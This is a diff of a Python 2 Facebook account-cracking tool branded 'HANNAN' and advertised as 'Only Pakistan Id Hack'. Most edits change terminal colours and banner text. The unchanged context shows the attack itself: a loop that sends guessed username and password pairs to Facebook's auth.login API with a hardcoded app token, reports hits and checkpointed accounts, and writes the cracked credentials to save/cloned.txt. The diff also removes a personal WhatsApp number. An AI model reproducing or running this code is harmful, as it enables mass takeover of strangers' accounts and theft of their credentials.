@@ -118,7 +118,7 @@ print  """
  
 logo1 = """
  
-    
+    u
  
 \033[1;93m🔴━━━❖❖HANNAN❖❖━━━━🔴
 \033[1;93m
@@ -131,7 +131,7 @@ logo1 = """
 \033[1;96m We are PakisaTani💜
 \033[1;96mOnly Pakistan Id Hack💜
  
-\033[1;99m If you face any problem contact me on Whatsapp +923188214452💜
+\033[1;96mOOOOOOOOooooo.......
  
 \033[1;96m------------------😘😘😘---------------------
  
@@ -159,14 +159,14 @@ logo2 = """
 \033[1;96m 🔴━━━❖ HAHA : MARK ZINGER BURGER ❖❖━━━━🔴
 \033[1;96m 
  
-\033[1;96m--------------------- \033[1;91mHANNAN\033[1;96m--------------------
+\033[1;96m---------------------\033[1;91mHANNAN\033[1;96m--------------------
  
     
  
 \033[1;95m WELCOME TO MY TOOL ”
 
                                                 
-\033[1;96m--------------------- HANNAN ANSARI--------------------
+\033[1;96m---------------------HANNAN ANSARI--------------------
 """
 CorrectUsername = "HANNAN"
 CorrectPassword = "ANSARI"
@@ -278,14 +278,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;96m(HANNAN-OK)  ' + k + c + user + '  |  ' + pass1                                       
+                print '\x1b[1;92m(HANNAN-OK)  ' + k + c + user + '  |  ' + pass1                                       
                 okb = open('save/cloned.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
                 oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;97m(HANNAN-CP) ' + k + c + user + '  |  ' + pass1
+                    print '\033[1;91m(HANNAN-CP) ' + k + c + user + '  |  ' + pass1
                     cps = open('save/cloned.txt', 'a')
                     cps.write(k+c+user+pass1+'\n')
                     cps.close()
@@ -302,7 +302,7 @@ def action():
                         oks.append(c+user+pass2)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;92m(HANNAN-CP) ' + k + c + user + '  |  ' + pass2
+                            print '\033[1;91m(HANNAN-CP) ' + k + c + user + '  |  ' + pass2
                             cps = open('save/cloned.txt', 'a')
                             cps.write(k+c+user+pass2+'\n')
                             cps.close()
@@ -319,7 +319,7 @@ def action():
                                 oks.append(c+user+pass3)
                             else:
                                 if 'www.facebook.com' in q['error_msg']:
-                                    print '\033[1;92m(HANNAN-CP) ' + k + c + user + '  |  ' + pass3 
+                                    print '\033[1;91m(HANNAN-CP) ' + k + c + user + '  |  ' + pass3 
                                     cps = open('save/cloned.txt', 'a')
                                     cps.write(k+c+user+pass3+'\n')
                                     cps.close()
@@ -336,7 +336,7 @@ def action():
                                         oks.append(c+user+pass4)
                                     else:
                                         if 'www.facebook.com' in q['error_msg']:
-                                            print '\033[1;92m(HANNAN-CP) ' + k + c + user + '  |  ' + pass4
+                                            print '\033[1;91m(HANNAN-CP) ' + k + c + user + '  |  ' + pass4
                                             cps = open('save/cloned.txt', 'a')
                                             cps.write(k+c+user+pass4+'\n')
                                             cps.close()
@@ -353,7 +353,7 @@ def action():
                                                 oks.append(c+user+pass5)
                                             else:
                                                 if 'www.facebook.com' in q['error_msg']:
-                                                    print '\033[1;97m(HANNAN-CP) ' + k + c + user + '  |  ' + pass5 
+                                                    print '\033[1;91m(HANNAN-CP) ' + k + c + user + '  |  ' + pass5 
                                                     cps = open('save/cloned.txt', 'a')
                                                     cps.write(k+c+user+pass5+'\n')
                                                     cps.close()
@@ -394,7 +394,7 @@ def action():
  
  
 \033[1;96mThnks for using
-\033[1;95mTATA\033[1;97mBYBY\033[1;96mGoodBye.
+\033[1;95mTATA \033[1;97mBYBY\033[1;96m GoodBye.
 \033[1;95m😊😊"""
  
     
